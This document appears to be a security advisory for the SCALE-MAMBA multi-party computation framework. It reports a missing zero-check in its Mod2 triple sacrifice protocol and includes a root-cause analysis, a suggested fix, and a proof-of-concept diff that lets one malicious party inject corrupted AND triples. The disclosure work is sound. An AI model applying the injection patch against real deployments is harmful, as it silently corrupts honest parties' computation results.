# SCALE-MAMBA: Missing Sacrifice Check in Mod2 Triple Generation (`Gen_Checked_Triples`) — Opened Check Values Never Compared to Zero

- **Vulnerability type**: Improperly Implemented Security Check for Standard (CWE-358);
  Insufficient Verification of Data Authenticity (CWE-345)
- **Affected product**: SCALE-MAMBA (KU Leuven COSIC), master @ `c111516`
- **Affected components**: `Player.x` — `src/Mod2Engine/Mod2Maurer.cpp`
  (`Gen_Checked_Triples`, Stage 2), consumed by `Mult_Bits`/`Mult_Bit`,
  `aBitVector2::Bitwise_AND`, GC evaluation (`src/GC/Q2_Evaluate.cpp`)
- **Severity**: High (CVSS 3.1 estimate: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N;
  one malicious protocol party suffices)

## Summary

SCALE-MAMBA's Mod2 engine validates Beaver-style AND triples `(a, b, c)` (which must satisfy
`c = a AND b`) using the bucket-sacrifice protocol of Furukawa et al. (ePrint 2016/944,
Algorithm 2.24). The final stage of `Gen_Checked_Triples` opens the check values

```
ans = z + c + sigma*a + rho*b + rho*sigma        (over GF(2))
```

which equal `0` for every valid triple and `delta != 0` for a triple corrupted as
`c = a*b + delta`. The code opens `ans` and MAC/consistency-checks the openings — but **never
compares the opened values to zero**. A single malicious party can therefore inject arbitrarily
corrupted triples at generation time with **zero detection probability**; every mod-2 AND
computed with such a triple silently produces a flipped result.

## Root Cause

`Gen_Checked_Triples` (src/Mod2Engine/Mod2Maurer.cpp:218-356) validates the output bucket
`D1` (`triples`) by sacrificing the helper buckets `D2..DB` (`Dkj`). The helper buckets are
properly checked by `check_routine` (src/Mod2Engine/Mod2Maurer.cpp:148-190, opens `wa/wb/wc`
and aborts unless `wc == wa AND wb`). The output bucket, however, relies solely on Stage 2:

```cpp
// src/Mod2Engine/Mod2Maurer.cpp:332-356 — Stage 2: open the sacrifice check values
      P.OP2->Open_To_All(ans, temp2, P, 0);   // opens ans = [z]+[c]+sigma*[a]+rho*[b]+rho*sigma
    }
  P.OP2->RunOpenCheck(P, aux, 0);             // only checks opening consistency
}                                             // ans is NEVER inspected -> function returns
```

`ans` has exactly two occurrences in the entire file — its declaration and the `Open_To_All`
call that writes it:

```bash
$ grep -n "ans" src/Mod2Engine/Mod2Maurer.cpp
334:  static vector<word> ans;
353:      P.OP2->Open_To_All(ans, temp2, P, 0);
```

`RunOpenCheck` only proves that all parties *saw the same openings* (hash consistency) — it
says nothing about the *values*. A corrupted triple's check value `ans = delta` is honestly
and consistently opened by everyone, and then silently discarded.

The algebra (GF(2): XOR = addition, AND = multiplication), with `rho = a+x`, `sigma = b+y`
and a valid helper triple `z = x*y`:

```
ans = xy + c + (b+y)a + (a+x)b + (a+x)(b+y) = c + ab = delta
```

so `ans == 0` iff the output triple is correct — this comparison is the final verification
equation of the paper, and it is simply absent from the code. A commented-out debugging call
(`/* TESTING ROUTINE: COMMENT OUT NEVER DELETE !!! */ //check_triples(...)`, line 281) shows
the authors were aware such a check belongs somewhere in this flow.

Call flow:

```
Player.x startup / queue refill
  -> Mod2_Triple_Thread                       src/Mod2Engine/Mod2_Thread.cpp:85,134
  -> Gen_Checked_Triples                      src/Mod2Engine/Mod2Maurer.cpp:218
       -> offline_Maurer_triples (D1)         :242   <- injection point (see below)
       -> offline_Maurer_triples (Dkj)        :249   (helpers; checked by check_routine)
       -> check_routine(Dkj...)               :294   (helpers verified)
       -> Stage 1/2 open rho/sigma/ans        :317-353
       -> RunOpenCheck                        :355   (consistency only)
       -> [MISSING: if (ans[i] != 0) abort]
  -> triples enter MTD.triples queue          Mod2_Thread.cpp:89,137
  -> consumed unchecked by Mult_Bits / Mult_Bit / aBitVector2::Bitwise_AND / Q2_Evaluate
```

## Attack Preconditions / Trigger Conditions

- The adversary controls one protocol party (SCALE-MAMBA's mod-2 engine targets the
  dishonest-majority / Q2 setting, so this is within the threat model); and
- the deployment uses the Maurer/Reduced offline phase with the Mod2 engine
  (the default for binary circuit processing); and
- the MPC program consumes mod-2 triples (`sregint` bitwise AND, GC evaluation, etc.).

No network tampering, no race, and no false opening is required: the adversary only changes
what *its own* triple-generation code shares — a capability every malicious party has by
definition.

The injection must target **only the output bucket D1**: helper buckets are verified by
`check_routine`, so a naive global injection aborts there (observed during testing). The
missing `ans == 0` check is precisely the only gap.

## Impact

- **Silent integrity loss**: every AND gate evaluated with a corrupted triple yields the
  complement of the true result; no party aborts and no error is raised. Honest parties accept
  wrong computation results (observed end-to-end, see PoC).
- The adversary chooses *where* to inject `delta`, i.e. can selectively flip chosen AND
  outputs (e.g. comparison bits driving branches), violating even security-with-abort, which
  requires an abort upon cheating.

## Proof of Concept (dynamically verified, end-to-end 3-party execution)

Environment: Docker image `scale-mamba-audit` (Ubuntu 20.04, x86_64 under emulation), full
SCALE-MAMBA build from unmodified sources, 3-party Q2-Replicated deployment (n=3, t=1,
Maurer offline) with real TLS certificates and `Setup.x` initialization.

**Malicious-party patch** (only the malicious party runs this; it changes solely what that
party shares — its legitimate capability):

```diff
--- a/src/Mod2Engine/Mod2Maurer.cpp
+++ b/src/Mod2Engine/Mod2Maurer.cpp
@@
+static thread_local bool attack_D1= false;   /* inject only while generating D1 */
+
 void mult_inner_subroutine_one(const Share2 &aa, const Share2 &bb, ...)
 {
   word prod= schur_sum_prod(aa, bb, P);
+  if (attack_D1)
+    prod^= 1;      /* valid, consistent sharing of a WRONG value: c = a*b + 1 */
   make_shares(cc, prod, P.G);
@@ void Gen_Checked_Triples(...)
+  attack_D1= true;
   offline_Maurer_triples(P, prss, triples, N);   /* D1 output bucket */
+  attack_D1= false;
```

Note the injection shares `prod+1` via `make_shares` — a *consistent* sharing of a wrong
value. (Flipping a local share copy instead is caught by the hash-consistency check,
`hash_fail`; replication holds each share on two parties.)

Test program (`Programs/mod2poc/mod2poc.mpc`; `sregint & sregint` consumes one Share2 triple
per 64-bit word via `aBitVector2::Bitwise_AND` -> `MTD.get_Triple` -> `Mult_Bits`):

```
a = sregint(5)
b = sregint(6)
print_ln("5 AND 6 = %s (expect 4)", (a & b).reveal())
print_ln("12 AND 10 = %s (expect 8)", (sregint(12) & sregint(10)).reveal())
print_ln("255 AND 15 = %s (expect 15)", (sregint(255) & sregint(15)).reveal())
```

compiled with the legacy pipeline (`python2 compile-mamba.py -s Programs/mod2poc`), then
`./Player*.x -pnb 5000 <i> Programs/mod2poc` for i = 0,1,2.

**Observed results (verbatim):**

Group 1 — baseline, 3 honest parties, unpatched code (correct):

```
5 AND 6 = 4 (expect 4)
12 AND 10 = 8 (expect 8)
255 AND 15 = 15 (expect 15)
```

Group 2 — attack, party 0 malicious + parties 1,2 honest, **all unpatched** (vulnerability):

```
5 AND 6 = 5 (expect 4)        <- wrong (LSB flipped; prod ^= 1 flips bit 0 of the 64-bit lane)
12 AND 10 = 9 (expect 8)      <- wrong
255 AND 15 = 14 (expect 15)   <- wrong
```

All three parties reach `End of prog`. **No party raises any error** — no
`Sacrifice_Check_Error`, no `mac_fail`, no `hash_fail`. The corrupted triples pass every
implemented check and the wrong outputs are silently accepted by the honest parties.

Group 3 — control, identical malicious party 0, **all parties patched with the suggested fix**:

```
terminate called after throwing an instance of 'Sacrifice_Check_Error'
  what():  Sacrifice : Mod2 Triples
```

(all three parties abort during triple generation; the program never executes.)

With the same malicious input, the only difference between "silent wrong result" and
"immediate abort" is the five-line `ans == 0` check — confirming both the vulnerability and
the fix.

## Static Verification

```bash
grep -n "ans" src/Mod2Engine/Mod2Maurer.cpp
# 334:  static vector<word> ans;                  <- declaration
# 353:      P.OP2->Open_To_All(ans, temp2, P, 0); <- written by the opening
# (no other occurrence: ans is never read)

sed -n 148,190p src/Mod2Engine/Mod2Maurer.cpp   # check_routine DOES abort on bad helpers
sed -n 332,356p src/Mod2Engine/Mod2Maurer.cpp   # Stage 2: open ans, then return
```

## Suggested Fix

Add the missing verification equation at the end of `Gen_Checked_Triples`:

```cpp
      P.OP2->Open_To_All(ans, temp2, P, 0);
    }
  P.OP2->RunOpenCheck(P, aux, 0);

  // The opened sacrifice values must all be zero, otherwise some
  // output triple (a,b,c) has c != a*b
  for (unsigned int i = 0; i < ans.size(); i++)
    if (ans[i] != 0)
      throw Sacrifice_Check_Error("Mod2 Triples");
}
```

(Verified: with this patch the reference attack aborts immediately with
`Sacrifice_Check_Error`, and honest executions are unaffected.)

## References

- Affected repository: https://github.com/KULeuven-COSIC/SCALE-MAMBA (master `c111516`)
- Underlying protocol: J. Furukawa, Y. Lindell, A. Nof, O. Weinstein — "High-Throughput
  Secure Three-Party Computation for Malicious Adversaries and an Honest Majority",
  ePrint 2016/944, Algorithm 2.24 (bucket sacrifice; the opened check values must be
  verified to be zero).

## Discoverer

*(to be filled by reporter)*
